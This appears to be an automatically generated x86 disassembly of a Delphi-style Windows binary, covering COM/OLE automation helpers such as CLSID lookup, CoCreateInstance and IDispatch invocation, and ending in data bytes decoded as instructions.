mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_4092ec
sub_46f776
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46f798
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46f80a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46f678
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax edi
call sub_46f6c8
lea eax [ edi + 0x10 ]
mov edx [ ebp + 0x10 ]
call sub_404174
lea eax [ edi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_404174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f811
lea eax [ ebp - 0x4 ]
call sub_404120
retn
add esp 0xfffffff0
call sub_4036f4
sub_46f811
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_46f864
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call StringFromCLSID
call sub_46f84c
mov eax esi
mov edx [ esp ]
call sub_404348
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_46f890
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call ProgIDFromCLSID
call sub_46f84c
mov eax esi
mov edx [ esp ]
call sub_404348
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_46f8bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_405b50
push eax
push r-xdata
push 0x5
push 0x0
push ebx
call CoCreateInstance
call sub_46f84c
pop esi
pop ebx
retn
sub_46f8f4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x48 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_404ab8
xor eax eax
push ebp
push sub_46fa38
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402da4
mov eax ebx
call sub_404988
mov [ ebp - 0x1c ] eax
push esi
push edi
mov esi r-xdata
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
call sub_405b50
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_404998
test eax eax
jle r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
mov ebx 0x15
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call GetComputerNameA
test eax eax
je r-xdata
mov ebx 0x10
jmp r-xdata
lea eax [ ebp - 0x44 ]
mov edx ebx
call sub_4043a8
mov eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov ecx 0x10
call sub_404390
mov eax [ ebp - 0x48 ]
pop edx
call sub_4082e8
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x0
push esi
call [ rw-data ]
call sub_46f84c
mov eax [ ebp - 0x8 ]
call sub_46f84c
mov eax edi
mov edx [ ebp - 0xc ]
call sub_405b68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fa3f
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_404b88
retn
mov ebx 0x15
jmp r-xdata
sub_46fa58
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46fae4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebx ] eax
lea eax [ ebp - 0x8 ]
call sub_405b50
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_418758
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46faeb
lea eax [ ebp - 0xc ]
call sub_405b50
lea eax [ ebp - 0x8 ]
call sub_405b50
retn
lea eax [ ebp - 0xc ]
call sub_405b50
push eax
push edi
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_418758
test al al
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_46fb04
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46fb96
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fb9d
lea eax [ ebp - 0x8 ]
call sub_405b50
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
lea eax [ ebp - 0x4 ]
call sub_405b50
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_418758
test al al
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_405b50
push eax
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_418758
test al al
je r-xdata
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_418758
test al al
je r-xdata
xor eax eax
mov [ ebx ] eax
sub_46fbb4
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46fcb6
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46fda8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
call sub_405b50
push eax
push 0x0
call GetErrorInfo
test eax eax
jne r-xdata
push esi
push ebx
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4043a8
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
call sub_4043a8
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4043a8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f798
jmp sub_403b5c
lea eax [ ebp - 0x8 ]
call sub_40482c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
lea eax [ ebp - 0xc ]
call sub_40482c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_40482c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_46fd78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fdaf
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404144
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404844
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
sub_46fdb8
push ebp
mov ebp esp
add esp 0xfffff9b0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_404ab8
xor eax eax
push ebp
push sub_4700eb
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
push ebp
push sub_4700c8
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx edi [ esi + 0x1 ]
cmp edi 0x40
jle r-xdata
test edi edi
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
lea eax [ ebp - 0x650 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edi
xor eax eax
mov al [ esi + 0x2 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
xor eax eax
mov al [ esi ]
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax edi
add eax eax
lea eax [ ebp + eax * 8 - 0x650 ]
mov [ ebp - 0x18 ] eax
xor ebx ebx
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x650 ]
and ecx 0xfff
cmp ecx 0x9
jne r-xdata
cmp [ ebp - 0xc ] 0x48
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x18 ]
mov [ eax + 0x8 ] 0x80020004
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x50 ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0xfffffffd
sub [ ebp - 0x2c ] 0x4
inc [ ebp - 0x24 ]
jmp r-xdata
mov eax 0x8
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
lea edx [ ebp + edx * 8 - 0x250 ]
mov [ ebp - 0x1c ] edx
test al al
je r-xdata
inc ebx
cmp edi ebx
jne r-xdata
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x50 ]
call sub_470398
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_404f48
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x1c ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
call sub_404f48
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x1c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x4008
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
sub [ ebp - 0x18 ] 0x10
mov al [ esi + ebx + 0x3 ]
mov edx eax
and dl 0x7f
and edx 0xff
mov [ ebp - 0xc ] edx
and al 0x80
cmp [ ebp - 0xc ] 0xa
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4700cf
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x250 ]
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov eax 0x3
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
cmp [ ebp - 0xc ] 0x5
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp - 0xc ]
or eax 0x4000
mov edx [ ebp - 0x18 ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
add [ ebp - 0x14 ] 0x4
inc [ ebp - 0x10 ]
jmp r-xdata
retn
dec ebx
mov eax [ ebp + ebx * 8 - 0x250 ]
push eax
call SysFreeString
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov ecx [ eax ]
mov eax edx
mov edx eax
mov eax ecx
call sub_404f24
cmp [ ebp - 0xc ] 0x7
jg r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov ecx [ ebp - 0x18 ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
add [ ebp - 0x14 ] 0xc
jmp r-xdata
mov eax [ ebp - 0x10 ]
lea eax [ ebp + eax * 8 - 0x250 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
call sub_404f48
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x20 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
inc [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov ecx 0x8
call sub_40fe90
add [ ebp - 0x14 ] 0x4
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
sub_4700fc
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
pop ecx
pop ecx
pop ebp
retn
sub_470130
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp - 0x4 ]
xor edi edi
mov [ ebp - 0x8 ] esp
mov eax [ ebp - 0xc ]
inc eax
shl eax 0x2
sub esp eax
lea eax [ ebp - 0x10 ]
mov [ eax ] esp
mov eax [ ebp - 0xc ]
sub eax edi
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
jmp r-xdata
mov eax ebx
call sub_408c10
mov esi eax
push 0x0
push 0x0
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax eax
add eax 0x3
and eax 0xfffffffc
sub esp eax
lea eax [ ebp - 0x18 ]
mov [ eax ] esp
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetThreadLocale
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp eax 0x80020006
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov [ eax + edx * 2 - 0x2 ] 0x0
inc esi
add ebx esi
inc edi
cmp edi [ ebp - 0xc ]
jne r-xdata
call sub_46f84c
push ebp
call sub_4700fc
pop ecx
jmp r-xdata
mov esp [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_470228
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x1 ] 0x40
jbe r-xdata
mov dx [ eax ]
cmp dx 0x9
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
cmp dx 0x4009
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_470210
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x104 ]
push eax
xor ecx ecx
mov cl [ ebx + 0x2 ]
inc ecx
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebx + eax + 0x3 ]
mov eax [ ebp - 0x4 ]
call sub_470130
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push esi
lea ecx [ ebp - 0x104 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46fdb8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_40f624
sub_4702c4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
xor edx edx
push ebp
push sub_470389
push [ fs : edx ]
mov [ fs : edx ] esp
cmp eax 0x80020009
jne r-xdata
push eax
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f6c8
mov esi eax
mov eax [ ebx + 0x1c ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x4 ]
call sub_4043a8
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0xc ]
call sub_4043a8
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x8 ]
call sub_4043a8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f798
mov esi eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470390
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404144
retn
push [ ebp - 0x4 ]
mov eax esi
jmp sub_403b5c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_404cc0
jmp r-xdata
sub_4703b4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
xor edx edx
mov edi esp
movzx ecx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] esp
movzx eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add ebx 0x3
mov esi [ ebp + 0x18 ]
movzx ecx [ ebx ]
cmp ecx 0x4
jne r-xdata
mov esi [ ebp + 0x14 ]
and al 0x7f
or eax 0x4000
cmp al 0xc
je r-xdata
mov [ ebp - 0xc ] esp
push edx
lea eax [ ebp - 0x30 ]
push eax
push ecx
push edx
call sub_4703a4
pop edx
pop ecx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edx
push rw-data
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
push 0xfffffffd
inc [ ebp - 0x4 ]
cmp [ ebx + 0x3 ] 0x9
je r-xdata
push [ esi + eax * 4 - 0x4 ]
dec eax
jne r-xdata
movzx eax [ ebx ]
test al 0x80
jne r-xdata
mov ebx [ ebp + 0xc ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
add esi 0x10
jmp r-xdata
cmp al 0x5
jb r-xdata
mov esp edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp - 0x30 ]
mov cl 0x1
push ecx
mov ecx [ ebp + 0x4 ]
jmp sub_4702c4
mov ecx 0x8
cmp [ ebx + 0x3 ] 0xd
jne r-xdata
inc ebx
dec ecx
jne r-xdata
push edx
push [ esi ]
push edx
push eax
add esi 0x4
cmp al 0x7
ja r-xdata
push [ esi + 0x4 ]
push [ esi ]
push edx
push eax
add esi 0x8
jmp r-xdata
sub_470498
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax esp
push eax
lea eax [ ebp + 0x14 ]
push eax
push eax
push [ ebx ]
lea eax [ ebx + 0x5 ]
push eax
push [ ebp + 0xc ]
call sub_4703b4
movzx eax [ ebx + 0x4 ]
mov ebx [ ebp + 0x8 ]
jmp [ eax * 4 + jump_table_4704c9 ]
fld [ esp + 0x8 ]
jmp r-xdata
fld [ esp + 0x8 ]
jmp r-xdata
fild [ esp + 0x8 ]
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax ebx
call sub_40f624
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
pop ebp
retn
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
call SysFreeString
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_470574
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
call [ rw-data ]
push 0x0
call CoInitialize
call sub_418758
mov [ rw-data ] al
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push 0x0
call [ rw-data ]
call sub_418758
mov [ rw-data ] al
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov al 0x1
test [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
mov [ edx ] al
retn
sub_4705ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_470662
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470669
retn
mov [ rw-data ] 0x1
mov eax [ rw-data ]
call sub_403390
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_404bd4
call CoUninitialize
sub_47066c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_46fbb4
mov eax sub_470228
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov [ eax ] sub_470498
mov eax r-xdata
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_470574
sub_4706c4
push 0xb8004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx + 0x680000fe ] bh
jbe r-xdata
jle r-xdata
add [ edx + 0x680000fe ] bh
jbe r-xdata
add [ eax ] al
add al 0x0
add [ ecx ] al
retn
add [ ecx ] dl
or eax 0x72615654
imul esp [ ecx + 0x6e ] 0x72724174
add [ ebx + 0x680000fe ] bh
jbe r-xdata
jge r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x654e724f
ja r-xdata
dec edi
insb
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
or al 0x0
add [ eax ] al
and [ ecx ] dl
inc eax
add [ ecx ] cl
popad
outsb
je r-xdata
add [ esi + edi * 8 - 0x74ab0000 ] bh
in al dx
xor eax eax
push ebp
push sub_470711
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470718
retn
inc esp
and al 0x4
hlt
add [ eax ] al
add [ esp + 0x4 ] 0xfffffff4
jmp r-xdata
adc [ ebx + 0x6b ] esp
push edx
arpl [ ebx + 0x4e ] bp
ja r-xdata
jb r-xdata
jb r-xdata
arpl [ ebx + 0x52 ] bp
jne r-xdata
jb r-xdata
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_470d02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405384
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4051d0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
jmp sub_470b04
outsb
imul ebp [ esi + 0x67 ] 0x74736e49
popad
outsb
arpl [ ebp + 0x8 ] sp
arpl [ ebx + 0x52 ] bp
insd
jmp r-xdata
outsb
jae r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ss
or [ edi ] al
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ss
or [ edi ] al
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
mov esp 0x32004708
or [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x10004708
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
fdiv [ 0x35e40040 ]
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x14004033 ] al
push esp
push ebx
jb r-xdata
jb r-xdata
add [ eax ] al
push esp
pop es
inc edi
add [ esi ] cl
inc eax
add [ eax + 0x7 ] bl
inc edi
outsd
je r-xdata
insd
popad
jns r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
add eax [ eax ]
add ah cl
int3
adc esp [ ebx + 0x6b ]
inc ecx
je r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
inc esp
and al 0x4
hlt
jne r-xdata
popad
outsb
arpl [ ebp + 0x11 ] sp
arpl [ ebx + 0x52 ] bp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ ebx ] al
or al 0x54
inc ebx
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
add [ fs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
